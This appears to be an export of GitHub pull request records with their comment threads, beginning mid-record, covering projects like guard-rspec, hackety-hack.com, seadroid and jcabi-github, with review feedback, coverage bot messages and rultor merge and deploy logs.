end\r\nend\r\n\r\ngroup :frontend do\r\n  guard :rspec, chdir: \'frontend\' do\r\n    watch(%r{^frontend/spec/.+_spec\\.rb$})\r\n  end\r\nend\r\n\r\ngroup :api do\r\n  guard :rspec, chdir: \'api\' do\r\n    watch(%r{^api/spec/.+_spec\\.rb$})\r\n  end\r\nend\r\n\r\n\r\n```\r\n\r\nor:\r\n\r\n```ruby\r\n\r\n%w(frontend backend api).each do |dir|\r\n  group dir.to_sym\r\n    guard :rspec, chdir: dir do\r\n      watch(%r{^#{dir}/spec/.+_spec\\.rb$})\r\n    end\r\n  end\r\nend\r\n\r\n```\r\n\r\nAnd so guard-rspec would run e.g.\r\n\r\n  `cd frontend && rspec spec/models/foo_spec.rb`\r\n\r\nand ""frontend"" is striped from file\'s path.\r\n\r\n[The above maybe useful in the README].\r\n', '@e2 Thank you! I understand it now.', '@907th - I should\'ve just mentioned the example to start with. It took me a while to wrap my own head around the whole thing. And I meant ""guard"", not ""group"" ...\r\n\r\n(I fixed the example above)', '\n[![Coverage Status](https://coveralls.io/builds/1353182/badge)](https://coveralls.io/builds/1353182)\n\nCoverage increased (+0.36%) when pulling **a64bf0712f41ea8659b99a2bf9a976932c5bf609 on lesniakania:master** into **073dfa8dce3e66f647e3c9709cd03bc420db8967 on guard:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1353195/badge)](https://coveralls.io/builds/1353195)\n\nCoverage increased (+0.36%) when pulling **44cad4adedaca2246e7bc68d714bed7616d356f8 on lesniakania:master** into **073dfa8dce3e66f647e3c9709cd03bc420db8967 on guard:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1371166/badge)](https://coveralls.io/builds/1371166)\n\nCoverage increased (+0.36%) when pulling **bafc4eab684dc6f699b0f990b5cafe09b8385844 on lesniakania:master** into **073dfa8dce3e66f647e3c9709cd03bc420db8967 on guard:master**.\n']"
288,guard/listen,286.0,Motivated by: #284. [ci skip],"['Sorry, looks like I put the [ci skip] in the wrong spot. My bad. :frowning: I accidentally pushed my commit and forgot to specify `[ci skip]`.', ""I added some comments in case you think there's anything important to change.\r\n\r\nI'm happy with the changes as they are - so let me know if you want to improve anything else, or if it's ok for me to merge this.\r\n\r\nThanks again so much!"", ""> I added some comments in case you think there's anything important to change.\r\n> \r\n> I'm happy with the changes as they are - so let me know if you want to improve anything else, or if it's ok for me to merge this.\r\n\r\nThat's great! I'm reviewing now and I'm sure I'll update things. I'll reply inline if I have questions. Thanks @e2!"", ""Thank you so much for your effort with this - it gave me lots of insights that will help me with other projects! \r\n\r\nAnd I've always been bothered by how complex issues with Listen seem to be when they occur - and how confusing I've let the documentation become. So thanks for all your time and focus you're putting into this!"", ""I hope that I properly squashed my commits (latest one being https://github.com/mhulse/listen/commit/d4d7d871b6bece46586dd16027bff625313d2b64) \xe2\x80\xa6 Let me know if I missed something (I can't remember the last time I had to rebase/squash things, so this is kinda new to me).\r\n\r\nAlso, I keep forgetting to add `[ci-skip]`. I promise that won't happen again.\r\n\r\nWith that said, I will have time later today to add to the WIKI. :+1: "", ""Well, you can rebase 2 ways (that I use):\r\n1) `git rebase -i origin/master` (and then replace the 'pick' with 'f' or 's')\r\n2) `git reset origin/master` and add the changes again with a new commit message\r\n\r\n(There are more ways, but I find these two help avoid most mistakes).\r\n\r\nAfter both operations, `git push -fu origin <your branch name>`"", '> Well, you can rebase 2 ways (that I use):\r\n> snip\r\n> After both operations, git push -fu origin <your branch name>\r\n\r\nAwesome! Thanks for tips. :+1: ']"
289,hacketyhack/hackety-hack.com,163.0,"This is a solution for the issue 32: https://github.com/hacketyhack/hackety-hack.com/issues/32 email updates.
Is my first contribution to a open source project so please tell me any advice. 
Thanks","['\n[![Coverage Status](https://coveralls.io/builds/155050/badge)](https://coveralls.io/builds/155050)\n\nCoverage remained the same when pulling **0af45e19a99cf35a07f6c0e8119e46fb79f522d8 on hcarreras:user_mailer** into **6df3474ffada2ece315df36e89ff73a0c0096605 on hacketyhack:master**.\n', ""Hi there,\r\n\r\nand welcome to the open source world! :-) \r\nThanks a lot for your contribution!\r\n\r\nAs for this pull request there are a few things:\r\n\r\n- most importantly the tests are [failing](https://travis-ci.org/hacketyhack/hackety-hack.com/builds/10087022) - at least one of them seems to be a simple typo though (reder instead of render)\r\n- at a first glance I don't see why you implemented the index action for User - what is it used for (it is cool to have, just want to understand :-) )\r\n- there are still a bunch of auto generated asset files and specs (with only pending specs) - it would be nice if you could remove then otherwise I/someone else will do so when merging\r\n\r\nThanks again and have a great weekend! :-D\r\nTobi\r\n"", ""First of all, thank you so much! We really need this feature. I'm really happy you're contributing it.\r\n\r\nSecond, I left a bunch of little comments. Lots of these are style kinds of questions, so they're not _wrong_, per se, just trying to keep them in line with the rest of the project. :)\r\n\r\nTobi's feedback is also good, please get rid of the files that do nothing and make sure the tests work!\r\n\r\n:heart: :smile: "", 'Thanks Steve for your feedback! =)\r\n\r\nSo in case you are wondering how to get the changes in, you can just make them locally (on the branch from which you sent this pull request), commit them, and then push again. They will be automatically added to this pull request.\r\n\r\nCheers + thanks for all the work,\r\nTobi', 'Thanks both of you and thanks for the corrections!!\r\nI\'m really happy of contribute with an open source project and I hope to learn all I can.\r\nTobi, I don\'t understand you with:\r\n""at a first glance I don\'t see you implemented the index action for User - what is it used to (it is cool to have, just want to understand :-) )""\r\nWhat that means? A link with user/index?\r\nI will do the necessary changes and I will commit again!', '@hcarreras argh stupid writing, small but important word **why** missing there. sorry. Correct version should be: ""at a first glance I don\'t see why you implemented the index action for User - what is it used for (it is cool to have, just want to understand :-) )"" (corrected it in my comment above). I was just asking because I saw that you implemented that action but couldn\'t see the direct relation to the general purpose of this pull request.', '@PragTob Oh! I understand now!\r\nWell you need an way to know who is going to receive the email, so if you go to users/index you will have a list of all users and a button to ""email him""\r\nNext step would be to have a button to ""Email everyone"" or something like that.\r\nAlso it would be good an user searcher.\r\nThat\'s how I see it, I don\'t know if there is a better way... what do you think?', '\n[![Coverage Status](https://coveralls.io/builds/156536/badge)](https://coveralls.io/builds/156536)\n\nCoverage remained the same when pulling **665a7f03caddd9b95b1975f2e9a30f96fde90d0f on hcarreras:user_mailer** into **6df3474ffada2ece315df36e89ff73a0c0096605 on hacketyhack:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/156552/badge)](https://coveralls.io/builds/156552)\n\nCoverage decreased (-0%) when pulling **3a5de0e80f8261f5d41f9d76b4657aa674c2e788 on hcarreras:user_mailer** into **6df3474ffada2ece315df36e89ff73a0c0096605 on hacketyhack:master**.\n', ""Oh I've just seen this.\r\n\r\nThe next time you make corrections please comment another time, then I get a notification that something happened. Don't get that for pushes. But thanks a lot looks good now, will just remove the 2 files with only pending specs :-)"", ""So thanks a lot again for your work! It's merged now :-) :heart: ""]"
290,hacketyhack/hackety-hack.com,167.0,A diffusion working an elegant.,"['ok, now it works fine.', ""Hi there,\r\n\r\nsorry that it took me some time to get back on this. Saw it then forgot about it. Thanks for your contribution :-)\r\n\r\nSee my comments on the code lines. I'd be especially happy if we could get rid of the direct class checks. For a duck typed language things should just behave the same or maybe they should be different methods. For making them behave the same always having an Array of users could be a solution I'm not too familiar with this!\r\n\r\nThanks!\r\nTobi"", ""Hi Tobi!\r\n\r\nThanks a lot for the feedback, I'm really appreciate it!\r\nI hope this new solution would be more elegant, probably we could do it better, we'll see it.\r\n\r\nAgain thank you\r\nHar\xc3\xad"", '\n[![Coverage Status](https://coveralls.io/builds/184547/badge)](https://coveralls.io/builds/184547)\n\nCoverage remained the same when pulling **78810f5e5d923be2656e698611de5084bd188b42 on hcarreras:user_mailer** into **15060c22b2af9a79ee61d549ab71d15f45a71997 on hacketyhack:master**.\n', 'Now, totally without class checking! :dancer: ', '\n[![Coverage Status](https://coveralls.io/builds/184562/badge)](https://coveralls.io/builds/184562)\n\nCoverage remained the same when pulling **f84c7016e33ba18996dc1a5b909f13cccb9d8a68 on hcarreras:user_mailer** into **15060c22b2af9a79ee61d549ab71d15f45a71997 on hacketyhack:master**.\n', ""Ops! I realized that tests doesn't work. I'll solve it later and I'll commit again. "", 'I think now is better. And I fix the tests (I have to do more in the future)', '\n[![Coverage Status](https://coveralls.io/builds/184788/badge)](https://coveralls.io/builds/184788)\n\nCoverage decreased (-17.95%) when pulling **a292839da170ede316175a60ff8721e83759fb9a on hcarreras:user_mailer** into **15060c22b2af9a79ee61d549ab71d15f45a71997 on hacketyhack:master**.\n', 'Hi there, one other question (now that I think of it): Aren\'t the choices like inbetween ""Send an email to one user"" and ""Send an email to all the users?"" \r\n\r\nI might be wrong here (am I?). But if that\'s the case then really a separate action and using `User.all` seems more appropriate. Because having a loop and calling `User.find_by_name` for every user seems to put a lot of load on the database.\r\n\r\nCheers + thanks,\r\nTobi\r\n', 'Hi! I begin my erasmus now and I\xc2\xb4m a little busy, I\xc2\xb4ll do it in a few days.\r\nUnd viele Gruesse von Jannik :D', 'WT was, JANNIK? :-D\r\n\r\nWell have loads of fun then and no worries, this is not totally urgent and if I get around to it I might check it out myself.\r\n\r\nGr\xc3\xbcsse zur\xc3\xbcck an Jannik!\r\n\r\nCheers,\r\nTobi', '\n[![Coverage Status](https://coveralls.io/builds/213043/badge)](https://coveralls.io/builds/213043)\n\nCoverage decreased (-18.19%) when pulling **b01cf5968327fbf9ebce1c7b04196129b8c1581c on hcarreras:user_mailer** into **15060c22b2af9a79ee61d549ab71d15f45a71997 on hacketyhack:master**.\n', ""Ok, now is just one query. It is the same actions but I think is better this way because:\r\n1. More elegant? Code is simple and less lines.\r\n2. It's easier to add more functionality. Maybe, it would be good in the future to can send emails to x users.\r\n\r\nPlease feedback!\r\n\r\nThanks\r\nHar\xc3\xad"", ""Looks good to me :-)\r\n\r\nI'd like some more specs but that's not totally necessary and I haven't written so many email specs myself!\r\n\r\nThanks for your hard work! =)\r\n\r\n(leaving this open a bit longer in case someone else wants to chime in)\r\n\r\nPS: Wow that was a quick fix\r\nPPS: your last 3 commit messages have been the same :-)\r\n"", 'Your feedback was also really fast! hahaha\r\nOk, I will try to write more specs these days.\r\nPS: Should I put always a different name in case I just deleted one line?\r\n\r\nThanks!', '\n[![Coverage Status](https://coveralls.io/builds/213076/badge)](https://coveralls.io/builds/213076)\n\nCoverage remained the same when pulling **c9cda91a9654ec4a57b4281e4b89eff5538b8489 on hcarreras:user_mailer** into **15060c22b2af9a79ee61d549ab71d15f45a71997 on hacketyhack:master**.\n', 'If you haven\'t pushed yet you can do `git add file` and then `git commit --amend` to add the changes to the previous commit. It\'s just confusing to see the same commit message 2/3 times in a row. I always wanna describe why/what I did in that commit. For deleting an outcommented line or puts statements I often end up with ""Oops forgot to delete unnecessary statement"" or something like that :-)', 'If someone can help me... \r\nhttp://stackoverflow.com/questions/19112493/spec-and-fabrication-validating-mailer-fabricationunfabricatableerror-no-cla', ""Just a couple of stabs in the dark here for now:\r\n\r\n* the Fabricator name is the same as the one of the let, maybe that is causing problems (weird stuff happens)\r\n* is there a way to show list all known Fabricators? if so do this in let clause before anything actually happens\r\n* super sure the Fabricator definitions are definitely loaded before rspec executes?\r\n* Have you tried just pulling the Fabricator definition out and do it right before the rspec spec?\r\n* Our fabricator version /might/ be outdated so you could try a `bundle update fabricator` (maybe this is a bug, that's fixed)\r\n\r\nJust some thoughts as I don't have time right now to dig deeper. Let me know what you find. If that doesn't work/help please give me a branch with that problem so I can check it out locally here :-)\r\n\r\nCheers and thanks!\r\nTobi"", ""ok, I added more specs, I think now is better.\r\nFinally I solved the problem, I'll comment the problem in the code, because maybe someone is interested."", '\n[![Coverage Status](https://coveralls.io/builds/240245/badge)](https://coveralls.io/builds/240245)\n\nCoverage decreased (-17.29%) when pulling **4376aa0cef086c173e03ab491adbdeed2c4a7cc0 on hcarreras:user_mailer** into **15060c22b2af9a79ee61d549ab71d15f45a71997 on hacketyhack:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/240273/badge)](https://coveralls.io/builds/240273)\n\nCoverage remained the same when pulling **4376aa0cef086c173e03ab491adbdeed2c4a7cc0 on hcarreras:user_mailer** into **15060c22b2af9a79ee61d549ab71d15f45a71997 on hacketyhack:master**.\n', ""... I'm waiting for feedback!"", 'Hi sorry,\r\n\r\nmust have missed that was one of my last days and San Francisco so i probably jetlagged missed it :-) Thanks for pinging us.\r\n\r\nLooks good although tests to see if the emailw as really delivered would be nice - dunno how hard that is to do though. I found [this](http://stackoverflow.com/questions/7284413/how-to-test-with-rspec-if-an-email-is-delivered-by-the-controller) on stackoverflow so maybe the problem with `ActionMailer::Base.deliveries` is that `config.action_mailer.delivery_method = :test` is not set in our test environment? Otherwise I fear another part of testing is broken or it might not work as intended :-|', ""ok, now it is covered, the problem: I have to repeat myself!\r\nI don't know is there is other way but I couldn't find anything else on internet.\r\nAlso I will ask in stackoverflow... maybe someone knows.\r\nAnyway I think is everything covered"", '\n[![Coverage Status](https://coveralls.io/builds/256085/badge)](https://coveralls.io/builds/256085)\n\nCoverage decreased (-17.29%) when pulling **5d57b919b40d69af12316e5cb0f1a857da56d6fb on hcarreras:user_mailer** into **15060c22b2af9a79ee61d549ab71d15f45a71997 on hacketyhack:master**.\n', 'If someone can help:\r\nhttp://stackoverflow.com/questions/19324062/dry-in-spec-mailer', ""the problem seems to be that whatever is passed in the specs as parameters seems not to make to the controller (it's nil)\r\n\r\nWorking on fixing it right now"", 'Fixed it and merged it. Thanks!']"
291,haiwen/seadroid,192.0,"This PR mainly works to download a folder.
If the current browsing directory is inside of a library, and there are some files and folders under such a directory. To download all files (folders excluded), open overflow menu and click ""Download folder"".
Also, this PR has put upload task list and download task list into one transfer activity. 

#### Features
- [x] download a folder
- [x] downloading progress of each file inside of the folder
- [x] put download & upload list together
- [x] canceling, retry, remove download & upload tasks

#### Optimizations
- [x] stop refresh if navigate out of current folder in `Folder Downloading`
- [x] use Timer to refresh transfer progress instead of using BroadcastReceiver in `Transfer Manager`
- [x] manage camera upload tasks by uploading queue
- [x] manage files upload and download by queue
- [x] add context menus to cancel, retry, remove tasks 

#### Download test case
- [x] download folder
- [x] update download progress in ReposFragment
- [x] update download progress in TransferActivity
- [x] cancel all download tasks
- [x] cancel one download task, do next in queue
- [x] retry a cancelled task
- [x] context menu should behave properly, including cancel, retry, remove
- [x] open a file in BrowserActivity (download a file)
- [x] open a file in ActivityFragment (download a file) 
- [x] download 3000 files
- [x] download a folder then refreshing repos or dirents
- [x] download a folder then downloading a file
- [x] download a folder then uploading a file 

#### Upload test case
- [x] upload multiple files (or images, or videos)
- [x] upload files then refreshing repos or dirents
- [x] upload files then downloading a folder
- [x] upload files then downloading a file
- [x] camera upload
- [x] update a file
- [x] cancel all upload tasks
- [x] cancel one upload task, do next in queue
- [x] retry a cancelled task
- [x] context menu should behave properly, including cancel, retry, remove
- [x] share files from third party Apps for uploading
- [x] upload 100 files
- [x] take camera to capture a photo and upload",[]
292,intuit/simple_deploy,138.0,"* When attribute name_encyprted (where name is name of archive) is set to true, simple deploy will pass in the GPG URL (based on Heirloom 0.10.0) to create / deploy.",[]
293,jcabi/jcabi-github,1047.0,"The things I'm currently missing from this library is Status API support. So I've implemented it. Please have a look. The implementation is rough at the edges, but works in a basic case of adding a new status for a commit.

Related links:
https://developer.github.com/v3/repos/statuses/#list-statuses-for-a-specific-ref
https://github.com/blog/1935-see-results-from-all-pull-request-status-checks

Please let me know if this is something you are interested in it. Do you require exact implementation of the API - like handling whole return messages from StatusAPI, or skeleton response is fine for now?","[""Seems there are checkstyle violations. I'll have them fixed today's evening."", 'Let me find a reviewer for this pull request, thanks for submitting it', '@longtimeago could you please review this pull request', ""@zygm0nt Thank you for the input! Please, see my remarks in the code. Also, you have to fix all code quality violation otherwise we can't merge your PR.\r\nNext time, please, don't do such huge PR with a lot of functionality at ones - it's hard to review, hard to merge and easy to lost in it. Generally, it's better to go step-by-step with as small PR as possible.\r\n\r\nThank you!"", ""@longtimeago The PR contains only the implementation of Status API :) I think it would be non functioning without all those bits. \r\n\r\nNevertheless, sorry for the excessive size of this PR. I've uploaded the updated code to Github."", '@zygm0nt see my answers in the code. Please, fix one more Findbugs violation \r\nhttps://travis-ci.org/jcabi/jcabi-github/jobs/58356267', ""I've fixed those. This branch still fails on travis, but only with openjdk6. It seems master does also fail, since even small PRs like #1059 does not build."", ""@zygm0nt Please, see several more remarks. I know, it's painful"", ""Hi, I've added a commit fixing your remarks. Please review."", '@zygm0nt Sorry for the delay. Thank you! Now we are good to go', '@rultor merge please', '> @rultor merge please\n\n@longtimeago Thanks for your request. @yegor256 Please confirm this.', ""@zygm0nt looks good, thanks for your contribution, but why you're using 8 spaces for indentation and sometimes 4? I tried by didn't find the logic... I would recommend you to configure your IDE to use 4 spaces always."", ""@yegor256 the indentation is the work of Intellij Idea - default settings. Didn't think about those as a big problem before :)\r\n\r\nIMHO this project has rather strict formatting rules. Have you considered providing a formatter that enforces them?"", ""I've fixed places you've mentioned. could you reiterate on this PR?"", '@zygm0nt try this [settings.jar](http://img.teamed.io/settings.jar) for IntelliJ', '@zygm0nt unit tests are still formatted with very strange indentation. please fix.', ""@yegor256 I've imported your settings.jar. After running 'code format' on the project I got ~380 changed files ;-) Reverted that back and fixed just the test you've mentioned."", '@rultor try to merge', ""> @rultor try to merge\n\n@yegor256 OK, I'll try to merge now. You can check the progress of the merge [here](http://www.rultor.com/t/3472-94589286)"", '> @rultor try to merge\n\n@yegor256 Oops, I failed. You can see the full log [here](http://www.rultor.com/t/3472-94589286) (spent 1min)\n\n```\nAuto-merging src/test/java/com/jcabi/github/mock/MkPublicKeyTest.java\nCONFLICT (add/add): Merge conflict in src/test/java/com/jcabi/github/mock/MkPublicKeyTest.java\nAuto-merging src/test/java/com/jcabi/github/mock/MkPublicKeysTest.java\nCONFLICT (add/add): Merge conflict in src/test/java/com/jcabi/github/mock/MkPublicKeysTest.java\nAuto-merging src/test/java/com/jcabi/github/mock/MkPullCommentTest.java\nCONFLICT (add/add): Merge conflict in src/test/java/com/jcabi/github/mock/MkPullCommentTest.java\nAuto-merging src/test/java/com/jcabi/github/mock/MkPullCommentsTest.java\nCONFLICT (add/add): Merge conflict in src/test/java/com/jcabi/github/mock/MkPullCommentsTest.java\nAuto-merging src/test/java/com/jcabi/github/mock/MkPullTest.java\nCONFLICT (add/add): Merge conflict in src/test/java/com/jcabi/github/mock/MkPullTest.java\nAuto-merging src/test/java/com/jcabi/github/mock/MkPullsTest.java\nCONFLICT (add/add): Merge conflict in src/test/java/com/jcabi/github/mock/MkPullsTest.java\nAuto-merging src/test/java/com/jcabi/github/mock/MkReferenceTest.java\nCONFLICT (add/add): Merge conflict in src/test/java/com/jcabi/github/mock/MkReferenceTest.java\nAuto-merging src/test/java/com/jcabi/github/mock/MkReferencesTest.java\nCONFLICT (add/add): Merge conflict in src/test/java/com/jcabi/github/mock/MkReferencesTest.java\nAuto-merging src/test/java/com/jcabi/github/mock/MkReleaseAssetTest.java\nCONFLICT (add/add): Merge conflict in src/test/java/com/jcabi/github/mock/MkReleaseAssetTest.java\nAuto-merging src/test/java/com/jcabi/github/mock/MkReleaseAssetsTest.java\nCONFLICT (add/add): Merge conflict in src/test/java/com/jcabi/github/mock/MkReleaseAssetsTest.java\nAuto-merging src/test/java/com/jcabi/github/mock/MkReleaseTest.java\nCONFLICT (add/add): Merge conflict in src/test/java/com/jcabi/github/mock/MkReleaseTest.java\nAuto-merging src/test/java/com/jcabi/github/mock/MkReleasesTest.java\nCONFLICT (add/add): Merge conflict in src/test/java/com/jcabi/github/mock/MkReleasesTest.java\nAuto-merging src/test/java/com/jcabi/github/mock/MkRepoCommitTest.java\nCONFLICT (add/add): Merge conflict in src/test/java/com/jcabi/github/mock/MkRepoCommitTest.java\nAuto-merging src/test/java/com/jcabi/github/mock/MkRepoCommitsTest.java\nCONFLICT (add/add): Merge conflict in src/test/java/com/jcabi/github/mock/MkRepoCommitsTest.java\nAuto-merging src/test/java/com/jcabi/github/mock/MkRepoTest.java\nCONFLICT (add/add): Merge conflict in src/test/java/com/jcabi/github/mock/MkRepoTest.java\nAuto-merging src/test/java/com/jcabi/github/mock/MkReposTest.java\nCONFLICT (add/add): Merge conflict in src/test/java/com/jcabi/github/mock/MkReposTest.java\nAuto-merging src/test/java/com/jcabi/github/mock/MkSearchTest.java\nCONFLICT (add/add): Merge conflict in src/test/java/com/jcabi/github/mock/MkSearchTest.java\nAuto-merging src/test/java/com/jcabi/github/mock/MkStorageTest.java\nCONFLICT (add/add): Merge conflict in src/test/java/com/jcabi/github/mock/MkStorageTest.java\nAuto-merging src/test/java/com/jcabi/github/mock/MkTagTest.java\nCONFLICT (add/add): Merge conflict in src/test/java/com/jcabi/github/mock/MkTagTest.java\nAuto-merging src/test/java/com/jcabi/github/mock/MkTagsTest.java\nCONFLICT (add/add): Merge conflict in src/test/java/com/jcabi/github/mock/MkTagsTest.java\nAuto-merging src/test/java/com/jcabi/github/mock/MkTreeTest.java\nCONFLICT (add/add): Merge conflict in src/test/java/com/jcabi/github/mock/MkTreeTest.java\nAuto-merging src/test/java/com/jcabi/github/mock/MkTreesTest.java\nCONFLICT (add/add): Merge conflict in src/test/java/com/jcabi/github/mock/MkTreesTest.java\nAuto-merging src/test/java/com/jcabi/github/mock/MkUserEmailsTest.java\nCONFLICT (add/add): Merge conflict in src/test/java/com/jcabi/github/mock/MkUserEmailsTest.java\nAuto-merging src/test/java/com/jcabi/github/mock/MkUserTest.java\nCONFLICT (add/add): Merge conflict in src/test/java/com/jcabi/github/mock/MkUserTest.java\nAuto-merging src/test/java/com/jcabi/github/mock/package-info.java\nCONFLICT (add/add): Merge conflict in src/test/java/com/jcabi/github/mock/package-info.java\nAuto-merging src/test/java/com/jcabi/github/package-info.java\nCONFLICT (add/add): Merge conflict in src/test/java/com/jcabi/github/package-info.java\nAuto-merging src/test/java/com/jcabi/github/wire/CarefulWireTest.java\nCONFLICT (add/add): Merge conflict in src/test/java/com/jcabi/github/wire/CarefulWireTest.java\nAuto-merging src/test/java/com/jcabi/github/wire/package-info.java\nCONFLICT (add/add): Merge conflict in src/test/java/com/jcabi/github/wire/package-info.java\nAuto-merging src/test/resources/log4j.properties\nCONFLICT (add/add): Merge conflict in src/test/resources/log4j.properties\nAutomatic merge failed; fix conflicts and then commit the result.\n\n```', '@zygm0nt please, merge from master', '@longtimeago Merged.', '@rultor please merge again', '> @rultor please merge again\n\n@longtimeago Thanks for your request. @yegor256 Please confirm this.', '@rultor try to merge again', ""> @rultor try to merge again\n\n@yegor256 OK, I'll try to merge now. You can check the progress of the merge [here](http://www.rultor.com/t/3472-94985714)"", '> @rultor try to merge again\n\n@yegor256 Done! FYI, the full log is [here](http://www.rultor.com/t/3472-94985714) (took me 19min)', ""@longtimeago I just added **22 mins** to your account, many thanks for your contribution.. 55947111 spent here... you're getting extra minutes here (c=7)... +22 added to your rating, current score is: [+4767](http://www.netbout.com/b/35024?open=rating)"", '@rultor please deploy']"
294,jcabi/jcabi-github,1061.0,"This is more symmetrical with `Repo.issues`, `Repo.pulls`, etc.
This also adds the ability to fetch an issue event by its number, which doesn't seem to have been possible previously.
Also, this means there will eventually be an `MkIssueEvents`, which will be a logical place to house an `MkEvent` creation method, which will be necessary when adding tests for #1055, #1056.
This PR is a prerequisite for some other code changes I'm working on that will fix those two issues.","['@cvrebert Thanks for your pull request, let me find someone who can review it', '@ggajos this pull request is for you, please review', '@ggajos Fixed/responded to all your comments.', '@cvrebert thanks, all good', '@rultor merge please', '> @rultor merge please\n\n@ggajos Thanks for your request. @yegor256 Please confirm this.', '@rultor try to merge', ""> @rultor try to merge\n\n@yegor256 OK, I'll try to merge now. You can check the progress of the merge [here](http://www.rultor.com/t/3417-93666914)"", '> @rultor try to merge\n\n@yegor256 Oops, I failed. You can see the full log [here](http://www.rultor.com/t/3417-93666914) (spent 2min)\n\n```\n+ container=jcabi_jcabi-github_1061\n+ as_root=false\n+ git clone --branch=master --depth=10 git@github.com:jcabi/jcabi-github.git repo\nInitialized empty Git repository in /tmp/rultor-MW0g/repo/.git/\n+ cd repo\n+ git config user.email me@rultor.com\n+ git config user.name rultor\n+ \'[\' -z \'sudo gem install pdd\' \']\'\n+ cd ..\n+ cat\n+ \'[\' false = true \']\'\n+ cat\n+ chmod a+x entry.sh\n+ cat\n+ echo \'sudo gem install pdd\' \';\' \'mvn clean install -Pjcabi-github -Pqulice --errors --settings ../settings.xml\' \';\' \'mvn clean\' \';\' \'pdd --source=$(pwd) --verbose --file=/dev/null\' \';\'\n+ rm -rf .gpg\n+ cd repo\n+ git remote add fork git@github.com:cvrebert/jcabi-github.git\n+ git remote update\nFetching origin\nFetching fork\nFrom github.com:cvrebert/jcabi-github\n * [new branch]      add-IssueEvents -> fork/add-IssueEvents\n * [new branch]      doc-latestEvent-IllegalStateException -> fork/doc-latestEvent-IllegalStateException\n * [new branch]      fix-1057   -> fork/fix-1057\n * [new branch]      gh-pages   -> fork/gh-pages\n * [new branch]      master     -> fork/master\n * [new branch]      patch-1    -> fork/patch-1\n+ \'[\' false == true \']\'\n+ git merge fork/add-IssueEvents\nMerge made by recursive.\n src/main/java/com/jcabi/github/IssueEvents.java   |   68 ++++++++++++\n src/main/java/com/jcabi/github/Repo.java          |   15 ++--\n src/main/java/com/jcabi/github/RtIssueEvents.java |  118 +++++++++++++++++++++\n src/main/java/com/jcabi/github/RtRepo.java        |   18 +---\n src/main/java/com/jcabi/github/mock/MkRepo.java   |   13 ++-\n src/test/java/com/jcabi/github/RtRepoITCase.java  |    2 +-\n src/test/java/com/jcabi/github/RtRepoTest.java    |    2 +-\n 7 files changed, 207 insertions(+), 29 deletions(-)\n create mode 100644 src/main/java/com/jcabi/github/IssueEvents.java\n create mode 100644 src/main/java/com/jcabi/github/RtIssueEvents.java\n+ docker_when_possible\n+ true\n++ uptime\n++ sed \'s/ /\\n/g\'\n++ tail -n 1\n+ load=0.29\n++ echo 0.29 \'>\' 30\n++ bc\n+ \'[\' 0 -eq 1 \']\'\n+ echo \'load average is 0.29, low enough to run a new Docker container\'\nload average is 0.29, low enough to run a new Docker container\n+ break\n+ cd ..\n+ \'[\' -n \'\' \']\'\n+ use_image=yegor256/rultor\n+ docker pull yegor256/rultor\nPulling repository yegor256/rultor\ntime=""2015-04-16T09:38:33+02:00"" level=""fatal"" msg=""Repository not found"" \n\n```', '@yegor256 The error is unrelated; please retry.', '@yegor256 Sorry for having to message you so much, but please, retry the merge.', '@rultor try to merge again', ""@cvrebert no problem, it's our technical faults, so you should excuse us instead"", ""> @rultor try to merge again\n\n@yegor256 OK, I'll try to merge now. You can check the progress of the merge [here](http://www.rultor.com/t/3417-93867057)"", '> @rultor try to merge again\n\n@yegor256 Done! FYI, the full log is [here](http://www.rultor.com/t/3417-93867057) (took me 10min)', ""there is a puzzle in this code `1061-5da99a0c`/#1067, we'll resolve it later"", ""@ggajos thanks, I just added **17 mins** to your account, payment `AP-3SS77622SV110383T`, 48 hours and 31 mins spent; you're getting extra minutes here (c=2); +17 added to your rating, at the moment it is: [+3764](http://www.netbout.com/b/35094?open=rating)"", '@rultor please deploy', ""> @rultor please deploy\n\n@dmarkov OK, I'll try to deploy now. You can check the progress [here](http://www.rultor.com/t/3417-94688070)"", '> @rultor please deploy\n\n@dmarkov Done! FYI, the full log is [here](http://www.rultor.com/t/3417-94688070) (took me 17min)']"
295,jcabi/jcabi-github,1063.0,"This will make possible the fixing of #1055 and #1056, since mock events can now be properly persisted.","['@cvrebert Let me find a reviewer for this pull request, thanks for submitting it', '@pinaf this pull request is for you, please review', '@cvrebert build is failing. please fix.', '@cvrebert this is a large PR. 17 comments for now.', ""@cvrebert cool, let's see the new commits :)"", '@pinaf Here they are. Addressed all your comments thus far.', '@cvrebert thanks. 3 minor comments above.', '@pinaf Fixed your 3 comments.', '@cvrebert 2 more that I missed in the test class.', '@pinaf Fixed those 2 things.', ""@cvrebert thanks! question: why don't you do new commits for every fix? it would be nice to see incremental commits instead of having to check the entire branch again."", '@rultor merge', '> @rultor merge\n\n@pinaf Thanks for your request. @yegor256 Please confirm this.', ""@pinaf It keeps the commit history cleaner. FWIW, this project doesn't seem to have a documented preference anywhere regarding rebasing."", '@rultor merge', ""> @rultor merge\n\n@yegor256 OK, I'll try to merge now. You can check the progress of the merge [here](http://www.rultor.com/t/3469-94394013)"", '> @rultor merge\n\n@yegor256 Done! FYI, the full log is [here](http://www.rultor.com/t/3469-94394013) (took me 7min)', 'these 2 puzzles were created in this ticket: `1063-59da9a37`/#1074, `1063-0509ffcb`', '@pinaf Thanks a lot, I just topped your account for **22 mins**, transaction ID `AP-4SK17295CX4944221`, total time was 95 hours. review comments (c=7) added as a bonus. +22 added to your rating, at the moment it is: [+7635](http://www.netbout.com/b/35128?open=rating)', '@rultor deploy pls', ""> @rultor deploy pls\n\n@dmarkov OK, I'll try to deploy now. You can check the progress [here](http://www.rultor.com/t/3469-95071538)"", '> @rultor deploy pls\n\n@dmarkov Done! FYI, the full log is [here](http://www.rultor.com/t/3469-95071538) (took me 14min)']"
296,jcabi/jcabi-github,1095.0,"Fixes #1094 by adding a new parameter class (`NewRepoSettings`) and changing `Repo.create()` to accept an instance of this class as its argument rather than a raw `JsonObject`.

